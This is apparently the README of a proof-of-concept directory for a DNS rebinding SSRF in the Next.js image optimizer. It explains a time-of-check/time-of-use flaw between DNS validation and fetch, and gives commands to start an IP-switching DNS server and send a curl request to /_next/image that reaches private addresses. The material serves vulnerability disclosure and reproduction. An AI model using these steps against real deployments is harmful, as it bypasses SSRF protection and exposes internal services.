# DNS Rebinding SSRF - Proof of Concept

## Files in This Directory

- **`dns-rebinding-server.py`** - DNS server that switches IPs for rebinding attack
- **`QUICKSTART.md`** - 5-minute reproduction guide
- **`POC_DNS_REBINDING_REPRODUCTION_GUIDE.md`** - Complete step-by-step guide

## Quick Test

```bash
# 1. Start DNS server
sudo python3 dns-rebinding-server.py

# 2. Test it
dig @127.0.0.1 ssrf.test  # Returns public IP
dig @127.0.0.1 ssrf.test  # Returns private IP

# 3. Use with Next.js
curl "http://localhost:3000/_next/image?url=http://ssrf.test/&w=640&q=75"
```

## Vulnerability Summary

**Location**: `/packages/next/src/server/image-optimizer.ts:711-770`

**Issue**: TOCTOU - DNS lookup happens twice with different results

```typescript
// Line 720: DNS lookup #1 (validation)
const records = await lookup(hostname)  // → Public IP ✅

// Line 738: DNS lookup #2 (fetch - implicit)
const res = await fetch(href)  // → Private IP ⚠️
```

**Impact**: Bypass SSRF protection, access internal resources

## Requirements

- Python 3.8+
- `pip3 install dnslib`
- sudo access (for port 53)
- Next.js application with image optimization

## Usage

See `QUICKSTART.md` for fastest reproduction.
See full guide for comprehensive testing scenarios.
